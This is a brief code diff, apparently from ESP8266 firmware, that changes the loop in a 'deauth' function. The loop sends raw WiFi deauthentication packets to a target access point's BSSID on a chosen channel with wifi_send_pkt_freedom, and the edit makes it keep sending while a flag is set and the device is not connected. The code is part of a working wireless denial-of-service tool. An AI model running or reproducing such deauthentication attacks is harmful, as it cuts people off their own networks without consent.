@@ -73,8 +73,8 @@ void deauth(const int channel, String BSSIDstr){
   
   if (channel != WiFi.channel()){ wifi_set_channel(channel); delay(100); }
 
-  while(deauthing == true) {
   int i; digitalWrite(D4, LOW);
+  while(deauthing == true && WiFi.status() != 3) {
     serialCommand();
     wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
     i++;
